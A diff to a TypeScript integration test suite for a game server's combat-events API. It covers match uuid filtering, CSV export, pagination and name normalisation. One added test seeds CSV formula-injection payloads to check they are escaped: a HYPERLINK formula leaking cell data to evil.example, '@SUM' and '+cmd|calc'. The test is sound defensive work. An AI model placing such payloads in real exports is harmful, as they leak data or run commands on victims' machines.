@@ -82,7 +82,7 @@ interface CombatRow {
   id: number;
   eventType: string;
   serverId: string;
-  matchId: number | null;
+  matchId: string | null;
   weapon: string | null;
   damage: string | null;
   attackerKit: string | null;
@@ -96,7 +96,7 @@ interface CombatRow {
 interface ListResponse {
   rows: CombatRow[];
   nextCursor: string | null;
-  approxTotal: number;
+  approxTotal: number | null;
 }
 
 const BASE = new Date();
@@ -111,6 +111,7 @@ describeIfDb('combat-events API (COMBAT-3)', () => {
   let sniper: string;
   let target: string;
   let medic: string;
+  let matchB: string;
 
   beforeAll(async () => {
     h = await buildIntegrationApp({
@@ -157,12 +158,23 @@ describeIfDb('combat-events API (COMBAT-3)', () => {
         ('revive', ${serverB}::uuid, 9001, ${medic}::uuid, ${target}::uuid,
          NULL, NULL, 'Medic', false, ${BASE.toISOString()}::timestamptz + interval '3 hour')
     `);
+
+    // Issue #50 (#1073): combat rows reference matches(id) by uuid.
+    matchB = uuidv7();
+    await h.db.execute(sql`
+      INSERT INTO matches (id, server_id, started_at)
+      VALUES (${matchB}::uuid, ${serverB}::uuid, ${BASE.toISOString()}::timestamptz)
+    `);
+    await h.db.execute(sql`
+      UPDATE combat_events SET match_uuid = ${matchB}::uuid WHERE server_id = ${serverB}::uuid
+    `);
   });
 
   afterAll(async () => {
     await h.db.execute(
       sql`DELETE FROM combat_events WHERE server_id IN (${serverA}::uuid, ${serverB}::uuid)`,
     );
+    await h.db.execute(sql`DELETE FROM matches WHERE id = ${matchB}::uuid`);
     await h.cleanup();
   });
 
@@ -207,10 +219,10 @@ describeIfDb('combat-events API (COMBAT-3)', () => {
     const body = await list(`?serverId=${serverB}&type=revive`);
     expect(body.rows).toHaveLength(1);
     const revive = body.rows[0];
-    expect(revive.eventType).toBe('revive');
-    expect(revive.attacker).toEqual({ player_id: medic, current_name: 'FieldMedic' });
-    expect(revive.victim).toEqual({ player_id: target, current_name: 'TargetDummy' });
-    expect(revive.weapon).toBeNull();
+    expect(revive?.eventType).toBe('revive');
+    expect(revive?.attacker).toEqual({ player_id: medic, current_name: 'FieldMedic' });
+    expect(revive?.victim).toEqual({ player_id: target, current_name: 'TargetDummy' });
+    expect(revive?.weapon).toBeNull();
   });
 
   it('applies combined filters (player + weapon + server + period)', async () => {
@@ -225,23 +237,63 @@ describeIfDb('combat-events API (COMBAT-3)', () => {
     expect(body.approxTotal).toBe(2);
   });
 
+  it('filters by match uuid and returns it on every row', async () => {
+    const body = await list(`?matchId=${matchB}`);
+    expect(body.rows).toHaveLength(3);
+    expect(body.rows.every((r) => r.matchId === matchB)).toBe(true);
+    expect(body.approxTotal).toBe(3);
+
+    const unrelated = await list(`?serverId=${serverA}&limit=1`);
+    expect(unrelated.rows[0]?.matchId).toBeNull();
+  });
+
+  it('exports the match uuid in the CSV match_id column', async () => {
+    const res = await h.app.inject({
+      method: 'GET',
+      url: `/api/v1/combat-events/export?matchId=${matchB}`,
+      headers: { cookie: ownerCookie },
+    });
+    expect(res.statusCode).toBe(200);
+    const lines = res.payload.trim().split('\r\n').slice(1);
+    expect(lines).toHaveLength(3);
+    expect(lines.every((line) => line.split(',')[3] === matchB)).toBe(true);
+  });
+
+  it('rejects a non-uuid matchId', async () => {
+    const res = await h.app.inject({
+      method: 'GET',
+      url: '/api/v1/combat-events?matchId=4200',
+      headers: { cookie: ownerCookie },
+    });
+    expect(res.statusCode).toBe(400);
+  });
+
   it('filters teamkills only', async () => {
     const body = await list(`?serverId=${serverB}&teamkillsOnly=true`);
     expect(body.rows).toHaveLength(1);
-    expect(body.rows[0].isTeamkill).toBe(true);
+    expect(body.rows[0]?.isTeamkill).toBe(true);
     expect(body.approxTotal).toBe(1);
   });
 
   it('matches a player on either side via playerId', async () => {
     const body = await list(`?serverId=${serverB}&playerId=${medic}`);
     expect(body.rows).toHaveLength(1);
-    expect(body.rows[0].attacker?.player_id).toBe(medic);
+    expect(body.rows[0]?.attacker?.player_id).toBe(medic);
   });
 
   it('resolves attackerName substring against the current name', async () => {
     const body = await list(`?serverId=${serverB}&attackerName=medic`);
     expect(body.rows).toHaveLength(1);
-    expect(body.rows[0].attacker?.current_name).toBe('FieldMedic');
+    expect(body.rows[0]?.attacker?.current_name).toBe('FieldMedic');
+  });
+
+  // Audit #138 — the name filter is normalised like the stored name.
+  it('resolves attackerName typed with a clan tag and doubled spaces', async () => {
+    const body = await list(
+      `?serverId=${serverB}&attackerName=${encodeURIComponent('[TAG]  Medic')}`,
+    );
+    expect(body.rows).toHaveLength(1);
+    expect(body.rows[0]?.attacker?.current_name).toBe('FieldMedic');
   });
 
   it('paginates deep via keyset with correct ordering and no gaps, each page < 500ms', async () => {
@@ -275,6 +327,17 @@ describeIfDb('combat-events API (COMBAT-3)', () => {
     expect(new Set(seen).size).toBe(4000);
   });
 
+  it('counts approxTotal on the first page only, not on cursor pages (#144)', async () => {
+    const first = await list(`?serverId=${serverA}&type=death&limit=10`);
+    expect(first.approxTotal).toBe(1000);
+    expect(first.nextCursor).not.toBeNull();
+    const second = await list(
+      `?serverId=${serverA}&type=death&limit=10&cursor=${encodeURIComponent(first.nextCursor ?? '')}`,
+    );
+    expect(second.rows).toHaveLength(10);
+    expect(second.approxTotal).toBeNull();
+  });
+
   it('reports an exact approxTotal when filters are active', async () => {
     const body = await list(`?serverId=${serverA}&type=death`);
     expect(body.approxTotal).toBe(1000);
@@ -300,6 +363,35 @@ describeIfDb('combat-events API (COMBAT-3)', () => {
     expect(lines[1]).toContain('TargetDummy');
   });
 
+  // Audit #137 — a player picks their own nickname; the export must not hand
+  // it to a spreadsheet as a formula.
+  it('defuses formula-looking nicknames and weapons in the CSV export', async () => {
+    const server = await seedServer(h.db, 'CombatCsvSrv');
+    const formulaName = '=HYPERLINK("http://evil.example/?"&A1,"x")';
+    const attacker = await seedPlayer(h.db, { name: formulaName });
+    const victim = await seedPlayer(h.db, { name: '@SUM(A1:A9)' });
+    await h.db.execute(sql`
+      INSERT INTO combat_events
+        (event_type, server_id, attacker_player_id, victim_player_id, weapon, attacker_kit, occurred_at)
+      VALUES
+        ('death', ${server}::uuid, ${attacker}::uuid, ${victim}::uuid,
+         '+cmd|calc', '-kit', ${BASE.toISOString()}::timestamptz)
+    `);
+
+    const res = await h.app.inject({
+      method: 'GET',
+      url: `/api/v1/combat-events/export?serverId=${server}`,
+      headers: { cookie: ownerCookie },
+    });
+    expect(res.statusCode).toBe(200);
+    const row = res.payload.trim().split('\r\n')[1] ?? '';
+    expect(row).toContain(`"'=HYPERLINK(""http://evil.example/?""&A1,""x"")"`);
+    expect(row).toContain(`"'@SUM(A1:A9)"`);
+    expect(row).toContain(`"'+cmd|calc"`);
+    expect(row).toContain(`"'-kit"`);
+    expect(row).not.toMatch(/(^|,)[=+@-][^0-9]/);
+  });
+
   it('returns vehicle_destroyed rows with a null victim player and the raw asset id', async () => {
     await h.db.execute(sql`
       INSERT INTO combat_events
@@ -312,11 +404,11 @@ describeIfDb('combat-events API (COMBAT-3)', () => {
     const body = await list(`?serverId=${serverB}&type=vehicle_destroyed`);
     expect(body.rows).toHaveLength(1);
     const row = body.rows[0];
-    expect(row.eventType).toBe('vehicle_destroyed');
-    expect(row.victim).toBeNull();
-    expect(row.victimVehicle).toBe('T72B3');
-    expect(row.attackerVehicle).toBe('BTR82A');
-    expect(row.attacker?.player_id).toBe(sniper);
+    expect(row?.eventType).toBe('vehicle_destroyed');
+    expect(row?.victim).toBeNull();
+    expect(row?.victimVehicle).toBe('T72B3');
+    expect(row?.attackerVehicle).toBe('BTR82A');
+    expect(row?.attacker?.player_id).toBe(sniper);
   });
 
   it('rejects an unauthenticated request', async () => {
